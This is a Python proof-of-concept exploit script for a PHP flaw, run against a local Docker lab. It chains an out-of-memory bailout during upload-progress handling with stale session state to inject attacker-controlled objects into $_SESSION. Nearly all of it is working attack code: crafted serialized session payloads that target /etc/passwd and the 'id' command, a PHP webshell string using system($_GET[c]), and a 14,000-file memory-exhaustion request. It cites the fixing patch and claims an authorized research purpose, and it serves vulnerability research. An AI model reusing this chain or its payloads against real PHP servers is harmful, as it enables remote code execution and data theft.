#!/usr/bin/env python3
"""
Chain D: OOM → stale session → __PHP_Incomplete_Class injection → RCE

Attack flow (Pure Chain D, no other chain needed):
  1. Write crafted session file with serialized object payload
  2. Trigger OOM with upload_progress on that session → OOM bailout
  3. Follow-up request with upload_progress → rfc1867 reads stale session →
     deserializes in incomplete_class_only mode → __PHP_Incomplete_Class
     with attacker-controlled properties appears in $_SESSION
  4. If endpoint uses $_SESSION values (string operations, includes, eval),
     the attacker-controlled properties enable RCE

The rfc1867 callback fires BEFORE RINIT. Without the fix (patch 3584a98),
PS() retains stale state from the previous request. After OOM bailout,
the session may not be properly closed, leaving PS(mod_data) as a dangling
pointer. The next request's rfc1867 callback then operates on this stale
state, reading the session file and deserializing it.

For authorized security research only.
"""

import re
import socket
import subprocess
import sys
import time


def send_raw(host, port, data, timeout=60):
    s = socket.create_connection((host, port), timeout=timeout)
    off = 0
    while off < len(data):
        s.sendall(data[off:off+65536])
        off += 65536
    s.settimeout(15)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def get_status(resp):
    if resp:
        return resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
    return "NO RESPONSE"


def get_body(resp):
    if b"\r\n\r\n" in resp:
        return resp.split(b"\r\n\r\n", 1)[1]
    return b""


def build_multipart_request(host, port, path, boundary, sid, progress_key,
                             num_files=5, fname_size=20):
    parts = []
    parts.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
        f"\r\n"
        f"{progress_key}\r\n"
    )
    for i in range(num_files):
        fname = chr(65 + (i % 26)) * max(1, fname_size - len(str(i))) + str(i)
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="f{i}"; filename="{fname}"\r\n'
            f"Content-Type: application/octet-stream\r\n"
            f"\r\n"
            f"X\r\n"
        )
    parts.append(f"--{boundary}--\r\n")
    body = "".join(parts).encode("latin1")
    cookie = f"PHPSESSID={sid}"
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: {cookie}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    return req


def build_oom_request(host, port, path, boundary, sid, progress_key):
    return build_multipart_request(
        host, port, path, boundary, sid, progress_key,
        num_files=14000, fname_size=500)


def get_pid(host, port):
    req = f"GET /index.php HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    resp = send_raw(host, port, req.encode())
    body = get_body(resp).decode("latin1", "replace")
    m = re.search(r"PID:\s*(\d+)", body)
    if not m:
        # Try stale_state_probe
        req = f"GET /stale_state_probe.php HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
        resp = send_raw(host, port, req.encode())
        body = get_body(resp).decode("latin1", "replace")
        m = re.search(r"PID:\s*(\d+)", body)
    return int(m.group(1)) if m else None


def write_session_file(sid, data):
    """Write crafted session data directly via docker exec."""
    # Escape for shell
    escaped = data.replace("\\", "\\\\").replace("'", "'\\''")
    subprocess.run(
        ["docker", "exec", "php2shell-apache", "bash", "-c",
         f"printf '%s' '{escaped}' > /tmp/sess_{sid} && "
         f"chown www-data:www-data /tmp/sess_{sid}"],
        capture_output=True, timeout=5)


def read_session_file(sid):
    r = subprocess.run(
        ["docker", "exec", "php2shell-apache", "cat", f"/tmp/sess_{sid}"],
        capture_output=True, timeout=5)
    return r.stdout


def clear_sessions():
    subprocess.run(
        ["docker", "exec", "php2shell-apache", "bash", "-c", "rm -f /tmp/sess_*"],
        capture_output=True, timeout=5)


def craft_session_payload():
    """
    Craft session data with objects that become __PHP_Incomplete_Class.

    PHP session serialization format: key|serialized_value

    The O: format creates objects. When deserialized in incomplete_class_only
    mode (as rfc1867 does), unknown classes become __PHP_Incomplete_Class
    with all properties preserved.

    We inject objects with properties that could be used for:
    - File operations (path properties)
    - Command execution (command properties)
    - Type confusion (numeric string properties in object context)
    """
    payloads = {}

    # Payload 1: Object with file path properties
    # If any code does file_get_contents($_SESSION['obj']->path), this triggers
    payloads['file_read'] = (
        'evil|O:10:"FileReader":2:{'
        's:4:"path";s:11:"/etc/passwd";'
        's:6:"output";s:11:"/tmp/exfil";'
        '}'
    )

    # Payload 2: Object with command property
    payloads['cmd_exec'] = (
        'evil|O:11:"CmdExecutor":1:{'
        's:3:"cmd";s:2:"id";'
        '}'
    )

    # Payload 3: Mixed - upload progress key + injected object
    # This simulates what happens when upload progress writes to session
    # and we've pre-loaded a crafted object
    payloads['mixed'] = (
        'upload_progress_PROBE|a:5:{'
        's:10:"start_time";i:1700000000;'
        's:14:"content_length";i:1000;'
        's:15:"bytes_processed";i:500;'
        's:4:"done";b:0;'
        's:5:"files";a:1:{i:0;a:7:{'
        's:10:"field_name";s:2:"f0";'
        's:4:"name";s:5:"a.txt";'
        's:8:"tmp_name";N;'
        's:5:"error";i:0;'
        's:4:"done";b:0;'
        's:10:"start_time";i:1700000000;'
        's:15:"bytes_processed";i:0;'
        '}}'
        '}|'
        'injected|O:11:"Exploitation":3:{'
        's:4:"file";s:11:"/etc/passwd";'
        's:7:"command";s:2:"id";'
        's:4:"data";s:24:"<?php system($_GET[c]);?>";'
        '}'
    )

    # Payload 4: SplFileObject-style (class exists in PHP)
    # When deserialized in incomplete_class_only mode, even real classes
    # become __PHP_Incomplete_Class
    payloads['spl_file'] = (
        'pwned|O:13:"SplFileObject":2:{'
        's:11:"pathName";s:11:"/etc/passwd";'  # Note: this property exists on SplFileInfo
        's:8:"openMode";s:1:"r";'
        '}'
    )

    return payloads


def main():
    host = "127.0.0.1"
    port = 18081
    boundary = "CHAIND_RCE"
    sid = "chaindrcepoc1234567890abcdef"

    print("=" * 70)
    print("  Chain D: OOM → Stale Session → Object Injection PoC")
    print("=" * 70)
    print()

    clear_sessions()

    # ── Step 0: Confirm single worker ──────────────────────────────
    pid = get_pid(host, port)
    print(f"[0] Worker PID: {pid}")
    print(f"    Confirming single-worker mode...")
    pids = set()
    for _ in range(5):
        p = get_pid(host, port)
        if p:
            pids.add(p)
    if len(pids) > 1:
        print(f"    WARNING: Multiple workers detected: {pids}")
        print(f"    Results may be non-deterministic.")
    else:
        print(f"    OK: Single worker (PID {pid})")
    print()

    payloads = craft_session_payload()

    for name, payload in payloads.items():
        print(f"{'─'*70}")
        print(f"  Testing payload: {name}")
        print(f"{'─'*70}")

        # Clean
        clear_sessions()

        # Write crafted session file
        print(f"  [1] Writing crafted session file...")
        write_session_file(sid, payload)
        stored = read_session_file(sid)
        print(f"      Size: {len(stored)} bytes")
        print(f"      Content: {stored[:200]}")
        print()

        # Step 2: Trigger OOM with upload progress on this session
        print(f"  [2] OOM bomb + upload_progress...")
        req = build_oom_request(host, port, "/index.php", boundary, sid, "oom_trigger")
        resp = send_raw(host, port, req, timeout=120)
        status = get_status(resp)
        print(f"      Status: {status}")
        body_text = get_body(resp).decode("latin1", "replace")
        if "Allowed memory" in body_text:
            for line in body_text.split("\n"):
                if "Allowed memory" in line:
                    print(f"      OOM: {line.strip()[:80]}")
                    break
        time.sleep(0.3)

        # Verify worker survived
        pid_after = get_pid(host, port)
        print(f"      PID after OOM: {pid_after} ({'survived' if pid_after == pid else 'CHANGED'})")

        # Check session file after OOM
        stored_after = read_session_file(sid)
        print(f"      Session after OOM: {len(stored_after)} bytes")
        if stored_after != stored:
            print(f"      [!] Session file MODIFIED by OOM request!")
            print(f"      New content: {stored_after[:300]}")
        print()

        # Step 3: Follow-up request with upload progress → reads stale session
        print(f"  [3] Follow-up: multipart + upload_progress → stale_state_probe.php")
        req = build_multipart_request(
            host, port, "/stale_state_probe.php", boundary, sid, "followup",
            num_files=2, fname_size=20)
        resp = send_raw(host, port, req)
        body = get_body(resp).decode("latin1", "replace")
        print(f"      Status: {get_status(resp)}")
        print()

        # Parse findings
        has_session = False
        has_incomplete = False
        has_injection = False
        for line in body.split("\n"):
            s = line.strip()
            if not s:
                continue
            if ("PID" in s or "session_status" in s or "SESSION" in s or
                "!!!" in s or "__PHP_Incomplete" in s or "KEY:" in s or
                "class:" in s or "prop " in s or "value:" in s or
                "content:" in s or "HAS_" in s):
                print(f"      {s}")
                if "SESSION" in s and "YES" in s:
                    has_session = True
                if "__PHP_Incomplete" in s:
                    has_incomplete = True
                if "evil" in s or "injected" in s or "pwned" in s:
                    has_injection = True

        print()
        if has_incomplete:
            print(f"  [+] RESULT: __PHP_Incomplete_Class INJECTED via Chain D!")
        elif has_injection:
            print(f"  [+] RESULT: Injected object found in \$_SESSION!")
        elif has_session:
            print(f"  [~] RESULT: \$_SESSION populated, but no object injection detected")
        else:
            print(f"  [-] RESULT: No stale state observed")
        print()

    # ── Summary ───────────────────────────────────────────────────
    print("=" * 70)
    print("  SUMMARY")
    print("=" * 70)
    print()
    print("  Chain D exploits the fact that rfc1867 callback fires BEFORE RINIT.")
    print("  After OOM bailout, the session file retains attacker-crafted data.")
    print("  The next request's upload_progress callback deserializes it in")
    print("  incomplete_class_only mode, creating __PHP_Incomplete_Class objects")
    print("  with attacker-controlled properties in \$_SESSION.")
    print()
    print("  For RCE, the target endpoint must use \$_SESSION values in a way that")
    print("  triggers the attacker-controlled properties. Common patterns:")
    print("    - \$_SESSION['key']->method()  → __call on Incomplete → Fatal")
    print("    - (string)\$_SESSION['key']    → __toString → Fatal")
    print("    - include \$_SESSION['path']   → arbitrary file include")
    print("    - eval/system/exec with \$_SESSION values")
    print("    - Type confusion: object where string expected")
    print()
    print("  The patch (3584a98) prevents this by calling php_rinit_session_globals()")
    print("  before the rfc1867 callback, ensuring PS() is clean.")

    return 0


if __name__ == "__main__":
    sys.exit(main())
